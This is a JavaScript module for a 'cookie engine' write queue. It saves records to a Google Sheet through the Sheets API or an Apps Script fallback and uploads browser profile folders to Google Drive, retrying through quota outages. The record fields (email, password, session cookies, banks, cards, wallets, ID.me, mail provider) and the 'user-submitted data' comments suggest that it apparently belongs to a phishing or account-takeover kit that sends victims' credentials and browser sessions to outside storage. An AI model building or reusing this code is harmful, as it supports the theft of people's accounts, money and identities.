import fs from 'fs';
import path from 'path';
import axios from 'axios';
import { URLSearchParams } from 'url';
import logger from './logger.js';
import { notifyTeam } from './notifyTeam.js';
import {
  isQuotaError,
  markQuotaExceeded,
  markQuotaRecovered,
  isQuotaBackoffActive
} from './cookieDataFetcher.js';

// Durable fire-and-forget write queue for the cookie engine.
//
// PROBLEM: Google quota outages (shared service account + single Google account)
// used to lose writes silently — CookieCache flushed with a flat 5s retry and NO
// App Script fallback; Drive uploads retried a fixed 5s x 3 and orphaned the profile
// dir when COMPLETED arrived during an outage.
//
// FIX: every write (sheet update, new-row append, Drive upload) is enqueued here.
// The worker owns the actual API call, coalesces per-browserId updates (last-wins,
// but a terminal status never gets overwritten back to an earlier state), backs off
// exponentially on quota/network errors (sharing the read-side circuit breaker via
// cookieDataFetcher's globalThis state), and mirrors everything to an on-disk
// journal so a process restart replays pending jobs instead of dropping them.
//
// The engine NEVER awaits the worker: enqueue() is synchronous and returns
// immediately (Drive returns a promise resolved when the job finishes).

const JOURNAL_PATH = path.join('/tmp', 'users_data', '.write_queue.json');
const WORKER_INTERVAL_MS = 5000;
const SHEET_MAX_PER_TICK = 5;
const DRIVE_MIN_INTERVAL_MS = 10000;   // never start an upload <10s after the last one finished
const JOURNAL_DEBOUNCE_MS = 2000;

const SHEET_RETRY_BACKOFFS = [10000, 30000, 60000, 120000, 300000]; // 10s → 5m
const SHEET_MAX_ATTEMPTS = 8;
const DRIVE_RETRY_BACKOFFS = [30000, 120000]; // 30s → 2m (raw upload already retries 3x5s internally)
const DRIVE_MAX_ATTEMPTS = 3;

// Mirror of routeHelper's DEFAULT_COOKIE_COLUMNS — used to filter App Script
// fallback payloads so GAS setMultipleCellDataByColumnSearch never throws on a
// header that doesn't exist in the sheet. routeHelper also mirrors the refreshed
// header set to globalThis.__knownCookieColumns for the same reason.
const DEFAULT_KNOWN_COLUMNS = new Set([
  'browserId', 'status', 'email', 'password', 'lastRun', 'lastJsonResponse',
  'cookieJSON', 'formattedCookie', 'cookieFileURL', 'driveUrl', 'platform',
  'verified', 'fullAccess', 'server', 'timestamp', 'lastUserActivity',
  'projectId', 'userId', 'formId', 'strictly', 'domain', 'ipData', 'deviceData',
  'banks', 'cards', 'socials', 'wallets', 'idMe', 'memo', 'mxRecord', 'possibleProvider'
]);

// globalThis-backed so ALL route modules (emails, banks, socials) and every
// webpack module scope share the same queue instance.
if (!globalThis.__writeQueueState) {
  globalThis.__writeQueueState = {
    sheetJobs: new Map(),   // browserId -> coalesced sheet job
    driveJobs: [],          // array of drive jobs (serialized, 1 at a time)
    driveRunning: 0,
    lastDriveEndAt: 0,
    workerTimer: null,
    workerRunning: false,
    journalTimer: null,
    journalDirty: false,
    journalLoaded: false
  };
}
const state = globalThis.__writeQueueState;

// BrowserIds with a Drive upload queued or in flight. route.js consults this set (via
// canDeleteUserDataDir) so no FAILED cleanup can wipe a profile dir while its drive job
// still needs it — that race produced "Aborting upload (profile gone)" and a silent
// COMPLETED. Mirrors the __uploadedBrowserData globalThis pattern so all module scopes
// share one set; a process restart repopulates it from loadJournal().
if (!globalThis.__pendingDriveUploads) globalThis.__pendingDriveUploads = new Set();

function markDriveUploadPending(browserId) {
  if (browserId) globalThis.__pendingDriveUploads.add(browserId);
}
function markDriveUploadDone(browserId) {
  if (browserId) globalThis.__pendingDriveUploads.delete(browserId);
}

function stripStatus(obj) {
  const { status, ...rest } = obj;
  return rest;
}

function filterKnownCols(obj) {
  const known = globalThis.__knownCookieColumns || DEFAULT_KNOWN_COLUMNS;
  const out = {};
  for (const [k, v] of Object.entries(obj)) {
    if (v !== undefined && v !== null && known.has(k)) out[k] = v;
  }
  return out;
}

// ---------------------------------------------------------------- journal ----

function serializeSheetJobs() {
  const arr = [];
  for (const job of state.sheetJobs.values()) {
    arr.push({
      browserId: job.browserId,
      merged: job.merged,
      writeStatus: job.writeStatus,
      isNewRow: job.isNewRow,
      attempts: job.attempts,
      nextRetryAt: job.nextRetryAt
    });
  }
  return arr;
}

function serializeDriveJobs() {
  return state.driveJobs.map((j) => ({
    browserId: j.browserId,
    userDataDir: j.userDataDir,
    attempts: j.attempts
  }));
}

function writeJournalSync() {
  try {
    fs.mkdirSync(path.dirname(JOURNAL_PATH), { recursive: true });
    fs.writeFileSync(JOURNAL_PATH, JSON.stringify({
      ts: Date.now(),
      sheetJobs: serializeSheetJobs(),
      driveJobs: serializeDriveJobs()
    }));
  } catch (e) {
    logger.error(`[writeQueue] Journal write failed: ${e.message}`);
  }
}

function saveJournal() {
  if (state.journalTimer) return;
  state.journalDirty = true;
  state.journalTimer = setTimeout(() => {
    state.journalTimer = null;
    if (!state.journalDirty) return;
    state.journalDirty = false;
    writeJournalSync();
  }, JOURNAL_DEBOUNCE_MS);
}

function flushJournalSync() {
  if (state.journalTimer) {
    clearTimeout(state.journalTimer);
    state.journalTimer = null;
  }
  if (!state.journalDirty) return;
  state.journalDirty = false;
  writeJournalSync();
}

function loadJournal() {
  if (state.journalLoaded) return;
  state.journalLoaded = true;
  try {
    if (!fs.existsSync(JOURNAL_PATH)) return;
    const parsed = JSON.parse(fs.readFileSync(JOURNAL_PATH, 'utf8'));
    if (parsed.sheetJobs && Array.isArray(parsed.sheetJobs)) {
      for (const sj of parsed.sheetJobs) {
        if (!sj.browserId) continue;
        if ((sj.attempts || 0) >= SHEET_MAX_ATTEMPTS) continue;
        state.sheetJobs.set(sj.browserId, {
          browserId: sj.browserId,
          merged: sj.merged || {},
          writeStatus: !!sj.writeStatus,
          isNewRow: !!sj.isNewRow,
          attempts: sj.attempts || 0,
          nextRetryAt: Date.now() // retry promptly after restart
        });
      }
    }
    if (parsed.driveJobs && Array.isArray(parsed.driveJobs)) {
      for (const dj of parsed.driveJobs) {
        if (!dj.browserId) continue;
        if ((dj.attempts || 0) >= DRIVE_MAX_ATTEMPTS) continue;
        // updateData is not persisted (can be large); the raw upload re-checks its
        // own guards and re-uploads the still-present profile dir idempotently.
        markDriveUploadPending(dj.browserId);
        state.driveJobs.push({
          browserId: dj.browserId,
          userDataDir: dj.userDataDir,
          attempts: dj.attempts || 0,
          nextRetryAt: Date.now(),
          resolve: null
        });
      }
    }
    logger.warn(`[writeQueue] Recovered ${state.sheetJobs.size} sheet job(s) and ${state.driveJobs.length} drive job(s) from journal.`);
    if (state.sheetJobs.size > 0 || state.driveJobs.length > 0) {
      try { fs.unlinkSync(JOURNAL_PATH); } catch (_) {}
      logger.info('[writeQueue] Journal claimed and removed.');
    }
  } catch (e) {
    logger.error(`[writeQueue] Journal load failed: ${e.message}`);
  }
}

process.on('exit', () => {
  try { flushJournalSync(); } catch (_) {}
});

// ------------------------------------------------------------- sheet write ----

async function writeViaSheetsApi(browserId, writeMap, isNewRow) {
  const { updateSheetRowApi, appendSheetRowApi } = await import('../app/api/googlesheets.js');
  try {
    if (isNewRow) {
      // Idempotent append: if a row with this browserId already exists (fast-path
      // append succeeded before a crash, or a prior retry of the same job), update
      // it instead of appending a duplicate.
      const updateFirst = await updateSheetRowApi('cookie', 'browserId', browserId, writeMap);
      if (updateFirst.success) return { success: true, via: 'sheets-update-existing' };
      if (!/not found/i.test(String(updateFirst.error || ''))) {
        return { success: false, error: updateFirst.error };
      }
      return await appendSheetRowApi('cookie', writeMap);
    }
    return await updateSheetRowApi('cookie', 'browserId', browserId, writeMap);
  } catch (e) {
    return { success: false, error: e.message };
  }
}

async function writeViaAppScript(browserId, writeMap, isNewRow) {
  const appScriptUrl = process.env.SCRIPT_URL;
  if (!appScriptUrl) return { success: false, error: 'SCRIPT_URL is not set.' };
  const params = new URLSearchParams({
    action: 'setCookieData',
    browserId: browserId,
    key: process.env.SCRIPT_KEY,
    lastRun: new Date().toISOString(),
    lastJsonResponse: writeMap.lastJsonResponse || JSON.stringify({
      browserId,
      timestamp: new Date().toISOString(),
      status: writeMap.status || 'UNKNOWN',
      message: 'Queued durable write'
    }),
    ...filterKnownCols(writeMap)
  });
  if (isNewRow) params.set('newRow', 'true');
  try {
    const response = await axios.post(appScriptUrl, params, {
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      timeout: 60000
    });
    if (!response.data || !response.data.success) {
      const details = response.data?.details ? ` ${JSON.stringify(response.data.details)}` : '';
      return { success: false, error: `${response.data?.error || 'Unknown App Script error'}${details}` };
    }
    return { success: true, via: 'app-script' };
  } catch (e) {
    return { success: false, error: e.message };
  }
}

// Idempotent new-row fallback: GAS update-by-search errors with
// "Row with browserId='X' not found." only when the row is truly missing — that's
// the only case we escalate to newRow=true, so a transient failure can never
// append a duplicate.
async function writeViaAppScriptNewRowIdempotent(browserId, writeMap) {
  const upd = await writeViaAppScript(browserId, writeMap, false);
  if (upd.success) return upd;
  const msg = String(upd.error || '').toLowerCase();
  if (!/(not found|no matching|no match|doesn't exist|does not exist|could not find|not exist)/.test(msg)) {
    return upd;
  }
  return await writeViaAppScript(browserId, writeMap, true);
}

// Returns true when the job is fully written. Does NOT bump attempts — retry
// bookkeeping is owned by the worker.
async function executeSheetJob(job) {
  const writeMap = job.writeStatus ? { ...job.merged } : stripStatus(job.merged);
  if (Object.keys(writeMap).length === 0) return true;

  let result = job.isNewRow
    ? await writeViaSheetsApi(job.browserId, writeMap, true)
    : await writeViaSheetsApi(job.browserId, writeMap, false);

  if (result.success) {
    markQuotaRecovered();
    logger.info(`[writeQueue] Sheet job done for ${job.browserId} (${result.via || 'sheets-api'}).`);
    return true;
  }

  if (isQuotaError(result.error)) {
    markQuotaExceeded();
    logger.warn(`[writeQueue] Sheets API quota hit for ${job.browserId}: ${result.error}`);
    return false;
  }

  logger.warn(`[writeQueue] Sheets API failed for ${job.browserId}: ${result.error}. Trying App Script fallback.`);
  result = job.isNewRow
    ? await writeViaAppScriptNewRowIdempotent(job.browserId, writeMap)
    : await writeViaAppScript(job.browserId, writeMap, false);

  if (result.success) {
    markQuotaRecovered();
    logger.info(`[writeQueue] Sheet job done for ${job.browserId} (${result.via}).`);
    return true;
  }

  if (isQuotaError(result.error)) markQuotaExceeded();
  logger.warn(`[writeQueue] App Script fallback failed for ${job.browserId}: ${result.error}`);
  return false;
}

// ------------------------------------------------------------ drive write ----

async function executeDriveJob(job) {
  const { uploadBrowserDataRaw } = await import('../app/api/googledrive.mjs');
  try {
    const url = await uploadBrowserDataRaw(job.browserId, job.updateData || {}, job.userDataDir);
    if (url) {
      markQuotaRecovered();
      logger.info(`[writeQueue] Drive job done for ${job.browserId}: ${url}`);
      if (job.resolve) job.resolve(url);
      return true;
    }
    return false;
  } catch (e) {
    if (isQuotaError(e.message)) markQuotaExceeded();
    logger.error(`[writeQueue] Drive job threw for ${job.browserId}: ${e.message}`);
    return false;
  }
}

// ------------------------------------------------------------------ worker ----

async function workerTick() {
  if (state.workerRunning) return;
  state.workerRunning = true;
  try {
    if (isQuotaBackoffActive()) {
      logger.debug('[writeQueue] Quota backoff active — worker paused.');
      return;
    }

    // --- Sheet jobs (coalesced, last-status-wins, bounded per tick) ---
    let processed = 0;
    for (const [browserId, job] of state.sheetJobs) {
      if (processed >= SHEET_MAX_PER_TICK) break;
      if (job.nextRetryAt > Date.now()) continue;
      processed++;
      const ok = await executeSheetJob(job);
      if (ok) {
        state.sheetJobs.delete(browserId);
      } else {
        job.attempts += 1;
        if (job.attempts >= SHEET_MAX_ATTEMPTS) {
          logger.error(`[writeQueue] Sheet job gave up for ${browserId} after ${job.attempts} attempts.`);
          state.sheetJobs.delete(browserId);
          notifyTeam({
            type: 'FATAL',
            platform: 'WriteQueue',
            browserId,
            detail: 'Sheet write failed after all retries',
            error: 'Durable write queue exhausted sheet job'
          });
        } else {
          job.nextRetryAt = Date.now() + SHEET_RETRY_BACKOFFS[Math.min(job.attempts - 1, SHEET_RETRY_BACKOFFS.length - 1)];
        }
      }
      saveJournal();
    }

    // --- Drive jobs (serialized 1-at-a-time, min-interval throttle) ---
    const head = state.driveJobs[0];
    if (
      head &&
      state.driveRunning === 0 &&
      (!head.nextRetryAt || head.nextRetryAt <= Date.now()) &&
      Date.now() - state.lastDriveEndAt >= DRIVE_MIN_INTERVAL_MS
    ) {
      state.driveRunning = 1;
      try {
        const ok = await executeDriveJob(head);
        if (ok) {
          markDriveUploadDone(head.browserId);
          state.driveJobs.shift();
        } else {
          head.attempts += 1;
          if (head.attempts >= DRIVE_MAX_ATTEMPTS) {
            logger.error(`[writeQueue] Drive job gave up for ${head.browserId} after ${head.attempts} attempts.`);
            markDriveUploadDone(head.browserId);
            state.driveJobs.shift();
            if (head.resolve) head.resolve(null);
            notifyTeam({
              type: 'FATAL',
              platform: 'WriteQueue',
              browserId: head.browserId,
              detail: 'Drive upload failed after all retries',
              error: 'Durable write queue exhausted drive job'
            });
          } else {
            head.nextRetryAt = Date.now() + DRIVE_RETRY_BACKOFFS[Math.min(head.attempts - 1, DRIVE_RETRY_BACKOFFS.length - 1)];
          }
        }
      } finally {
        state.driveRunning = 0;
        state.lastDriveEndAt = Date.now();
      }
      saveJournal();
    }

    // Idle → stop the worker until the next enqueue.
    if (state.sheetJobs.size === 0 && state.driveJobs.length === 0 && state.driveRunning === 0) {
      clearInterval(state.workerTimer);
      state.workerTimer = null;
    }
  } catch (e) {
    logger.error(`[writeQueue] Worker tick error: ${e.message}`);
  } finally {
    state.workerRunning = false;
  }
}

function ensureWorker() {
  loadJournal();
  if (!state.workerTimer) {
    state.workerTimer = setInterval(workerTick, WORKER_INTERVAL_MS);
    workerTick().catch((e) => logger.error(`[writeQueue] Initial tick error: ${e.message}`));
  }
}

// --------------------------------------------------------------- public API ----

/**
 * Queue a sheet update for a browserId. Consecutive updates for the same row are
 * coalesced (later fields win). `writeStatus` controls whether the ENGINE-owned
 * status field is written — CookieCache data-only flushes pass false, engine
 * terminal cascades pass true so COMPLETED/FAILED actually reaches the sheet.
 * `isNewRow` marks an append job; the executor is idempotent (update-then-append).
 */
export function enqueueSheetUpdate(browserId, merged, { writeStatus = false, isNewRow = false } = {}) {
  if (!browserId) return;
  loadJournal();
  const existing = state.sheetJobs.get(browserId);
  const nextMerged = existing ? { ...existing.merged, ...merged } : { ...merged };
  state.sheetJobs.set(browserId, {
    browserId,
    merged: nextMerged,
    writeStatus: writeStatus || (existing && existing.writeStatus === true),
    isNewRow: isNewRow || !!(existing && existing.isNewRow),
    attempts: existing ? existing.attempts : 0,
    nextRetryAt: existing ? existing.nextRetryAt : 0
  });
  saveJournal();
  ensureWorker();
}

/**
 * Immediate single write attempt (Sheets API → App Script), used by
 * CookieCache.immediateFlush so user-submitted data still lands promptly.
 * Returns true on success; on failure the caller enqueues a durable retry.
 */
export async function writeSheetRowNow(browserId, dataOnly, isNewRow = false) {
  const job = { browserId, merged: dataOnly, writeStatus: false, isNewRow, attempts: 0, nextRetryAt: 0 };
  return await executeSheetJob(job);
}

/**
 * Queue a Drive profile upload. Resolves with the driveUrl when the job finally
 * succeeds, or null after all attempts are exhausted. Uploads are serialized
 * (1 at a time) so concurrent COMPLETED finalizers never hammer the shared quota.
 */
export function enqueueDriveUpload(browserId, updateData, userDataDir) {
  loadJournal();
  markDriveUploadPending(browserId);
  return new Promise((resolve) => {
    const existingIdx = state.driveJobs.findIndex((j) => j.browserId === browserId);
    if (existingIdx !== -1) {
      // Same browser already queued — supersede the older job (resolve it as a
      // no-op; the newest job performs the upload and resolves its caller).
      const existing = state.driveJobs.splice(existingIdx, 1)[0];
      if (existing.resolve) existing.resolve(null);
    }
    state.driveJobs.push({ browserId, updateData, userDataDir, attempts: 0, nextRetryAt: 0, resolve });
    saveJournal();
    ensureWorker();
  });
}

export function startWriteQueueWorker() {
  ensureWorker();
}

export function stopWriteQueueWorker() {
  if (state.workerTimer) {
    clearInterval(state.workerTimer);
    state.workerTimer = null;
  }
  flushJournalSync();
}